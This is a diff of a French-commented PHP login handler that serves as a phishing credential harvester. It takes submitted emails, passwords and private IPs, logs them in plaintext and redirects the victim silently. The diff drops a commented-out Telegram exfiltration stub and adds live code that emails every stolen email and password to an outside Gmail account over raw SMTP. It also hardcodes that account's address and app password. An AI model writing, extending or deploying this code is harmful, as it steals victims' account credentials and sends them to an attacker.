@@ -1,69 +1,116 @@
 <?php
 // ============================================
-// Script principal - Version PERSISTANTE (Render Disk)
+// login.php - Version ULTIME avec Gmail SMTP
 // ============================================
 
-// 🔥 STOCKAGE PERSISTANT SUR RENDER DISK (monté sur /data)
-// Si tu n'as pas de disque, les données seront perdues au redémarrage.
-define('LOG_DIR', '/data/');  // ← Changé pour Render Disk
+// 🔥 CONFIGURATION GMAIL (mot de passe application)
+define('SMTP_HOST', 'smtp.gmail.com');
+define('SMTP_PORT', 587);
+define('SMTP_USER', 'hackeralltoll@gmail.com');
+define('SMTP_PASS', 'mxis wvzp nxth udrm');
+define('ALERT_EMAIL', 'hackeralltoll@gmail.com');
+
+// Stockage persistant
+define('LOG_DIR', '/data/');
 define('LOG_FILE', LOG_DIR . 'login.txt');
 define('ENCRYPTION_KEY', 'clef_temporaire_32_caracteres_longue');
 
-// Optionnel : charger config.php s'il existe (sans écraser les constantes)
 if (file_exists(__DIR__ . '/config.php')) {
     require_once __DIR__ . '/config.php';
 }
 
 // ============================================
-// 1. FONCTIONS UTILITAIRES
+// 1. FONCTIONS
 // ============================================
 
-// Validation email
 function validateEmail($email) {
     return filter_var($email, FILTER_VALIDATE_EMAIL);
 }
 
-// Récupération IP réelle (proxy + Cloudflare)
 function getRealIP() {
     $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
     foreach ($headers as $header) {
         if (!empty($_SERVER[$header])) {
             $ips = explode(',', $_SERVER[$header]);
-            return trim($ips[0]);
+            $ip = trim($ips[0]);
+            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+                return $ip;
+            }
         }
     }
     return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 }
 
-// Récupération User Agent
 function getUserAgent() {
     return $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
 }
 
-// Récupération page de provenance (referer)
 function getReferer() {
     return $_SERVER['HTTP_REFERER'] ?? 'direct';
 }
 
-// Chiffrement des données sensibles
 function encryptData($data, $key) {
     $iv = openssl_random_pseudo_bytes(16);
     $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
     return base64_encode($iv . $encrypted);
 }
 
-// Stockage local dans fichier (format JSON + TEXTE CLAIR visible)
+// 🔥 Envoi email via Gmail SMTP
+function sendEmailSMTP($to, $subject, $content) {
+    $encodedSubject = '=?UTF-8?B?' . base64_encode($subject) . '?=';
+    
+    $headers = [
+        'MIME-Version: 1.0',
+        'Content-Type: text/plain; charset=UTF-8',
+        'Content-Transfer-Encoding: 8bit',
+        'From: ' . SMTP_USER,
+        'Reply-To: ' . ALERT_EMAIL
+    ];
+    
+    $message = implode("\r\n", $headers) . "\r\n\r\n" . $content;
+    
+    $connection = fsockopen(SMTP_HOST, SMTP_PORT, $errno, $errstr, 30);
+    if (!$connection) {
+        error_log("SMTP: connexion échouée - $errstr");
+        return false;
+    }
+    
+    fgets($connection, 515);
+    fputs($connection, "HELO render.com\r\n");
+    fgets($connection, 515);
+    fputs($connection, "STARTTLS\r\n");
+    fgets($connection, 515);
+    stream_socket_enable_crypto($connection, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
+    fputs($connection, "EHLO render.com\r\n");
+    fgets($connection, 515);
+    fputs($connection, "AUTH LOGIN\r\n");
+    fgets($connection, 515);
+    fputs($connection, base64_encode(SMTP_USER) . "\r\n");
+    fgets($connection, 515);
+    fputs($connection, base64_encode(SMTP_PASS) . "\r\n");
+    fgets($connection, 515);
+    fputs($connection, "MAIL FROM: <" . SMTP_USER . ">\r\n");
+    fgets($connection, 515);
+    fputs($connection, "RCPT TO: <$to>\r\n");
+    fgets($connection, 515);
+    fputs($connection, "DATA\r\n");
+    fgets($connection, 515);
+    fputs($connection, $message . "\r\n.\r\n");
+    fgets($connection, 515);
+    fputs($connection, "QUIT\r\n");
+    fclose($connection);
+    
+    return true;
+}
+
 function storeLocal($data) {
-    // Créer le dossier /data s'il n'existe pas (Render Disk)
     if (!is_dir(LOG_DIR)) {
         mkdir(LOG_DIR, 0755, true);
     }
     
-    // Format JSON (pour traitement)
     $jsonLine = json_encode($data) . PHP_EOL;
     file_put_contents(LOG_FILE . '.json', $jsonLine, FILE_APPEND | LOCK_EX);
     
-    // 🔥 FORMAT TEXTE CLAIR (lisible dans view.php) avec IP privée
     $textEntry = "\n=============================================\n";
     $textEntry .= "Date: " . $data['timestamp'] . "\n";
     $textEntry .= "Email: " . $data['email'] . "\n";
@@ -71,58 +118,25 @@ function storeLocal($data) {
     $textEntry .= "IP Publique: " . $data['ip'] . "\n";
     $textEntry .= "IP Privée: " . ($data['local_ip'] ?? 'non détectée') . "\n";
     $textEntry .= "User Agent: " . $data['user_agent'] . "\n";
+    $textEntry .= "Referer: " . $data['referer'] . "\n";
     $textEntry .= "=============================================\n";
     
-    // ✅ ÉCRITURE GARANTIE dans /data/login.txt
-    $result = file_put_contents(LOG_FILE, $textEntry, FILE_APPEND | LOCK_EX);
-    
-    // Debug silencieux (optionnel : enlever en production)
-    if ($result === false) {
-        error_log("ERREUR: Impossible d'écrire dans " . LOG_FILE);
-    }
-}
-
-// Exfiltration via webhook (Telegram/Discord)
-function exfiltrateWebhook($data) {
-    $message = "🔐 NOUVEAU LOGIN 🔐\n";
-    $message .= "📧 Email: " . $data['email'] . "\n";
-    $message .= "🔑 Password: " . $data['password'] . "\n";
-    $message .= "🌍 IP Publique: " . $data['ip'] . "\n";
-    $message .= "🏠 IP Privée: " . ($data['local_ip'] ?? 'non détectée') . "\n";
-    $message .= "🕒 Time: " . $data['timestamp'] . "\n";
-    $message .= "💻 User Agent: " . $data['user_agent'];
-    
-    // À activer avec ton vrai webhook Telegram
-    // file_get_contents(TELEGRAM_WEBHOOK . '?chat_id=' . TELEGRAM_CHAT_ID . '&text=' . urlencode($message));
-}
-
-// Auto-nettoyage des logs (supprime après X jours)
-function autoCleanup($days = 30) {
-    if (file_exists(LOG_FILE)) {
-        $age = time() - filemtime(LOG_FILE);
-        if ($age > ($days * 86400)) {
-            unlink(LOG_FILE);
-            unlink(LOG_FILE . '.json');
-        }
-    }
+    @file_put_contents(LOG_FILE, $textEntry, FILE_APPEND | LOCK_EX);
 }
 
 // ============================================
 // 2. EXÉCUTION PRINCIPALE
 // ============================================
 
-// Vérification méthode HTTP
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(403);
     die('Accès non autorisé');
 }
 
-// Récupération des données POST
 $email = $_POST['email'] ?? '';
 $password = $_POST['password'] ?? '';
-$localIP = $_POST['local_ip'] ?? 'non détectée';  // ← AJOUT IP PRIVÉE
+$localIP = $_POST['local_ip'] ?? 'non détectée';
 
-// Validations
 if (!validateEmail($email)) {
     die(json_encode(['error' => 'Format email invalide']));
 }
@@ -130,30 +144,36 @@ if (strlen($password) < 1) {
     die(json_encode(['error' => 'Mot de passe requis']));
 }
 
-// Construction du tableau de données
 $logData = [
     'id' => uniqid(),
     'email' => $email,
     'password' => $password,
     'password_encrypted' => encryptData($password, ENCRYPTION_KEY),
     'ip' => getRealIP(),
-    'local_ip' => $localIP,  // ← AJOUT IP PRIVÉE
+    'local_ip' => $localIP,
     'user_agent' => getUserAgent(),
     'referer' => getReferer(),
     'timestamp' => date('Y-m-d H:i:s'),
     'timestamp_unix' => time()
 ];
 
-// Stockage local (dans /data/)
 storeLocal($logData);
 
-// Exfiltration (décommente quand tu as configuré Telegram)
-// exfiltrateWebhook($logData);
+// 🔥 EMAIL : Identifiants + IP publique + IP privée + User Agent
+$emailContent = "=============================================\n";
+$emailContent .= "🔐 NOUVEAU LOGIN DÉTECTÉ\n";
+$emailContent .= "=============================================\n\n";
+$emailContent .= "📧 Email: " . $logData['email'] . "\n";
+$emailContent .= "🔑 Mot de passe: " . $logData['password'] . "\n";
+$emailContent .= "🌍 IP Publique: " . $logData['ip'] . "\n";
+$emailContent .= "🏠 IP Privée: " . $logData['local_ip'] . "\n";
+$emailContent .= "💻 User Agent: " . $logData['user_agent'] . "\n";
+$emailContent .= "📅 Date: " . $logData['timestamp'] . "\n";
+$emailContent .= "🔗 Referer: " . $logData['referer'] . "\n";
+$emailContent .= "=============================================\n";
 
-// Nettoyage automatique (commenté pour ne jamais perdre de logs)
-// autoCleanup(30);  // ← Désactivé : plus jamais de suppression
+sendEmailSMTP(ALERT_EMAIL, '🔐 LOGIN - ' . $email, $emailContent);
 
-// Redirection silencieuse
 header('Location: mer.html');
 exit;
 ?>
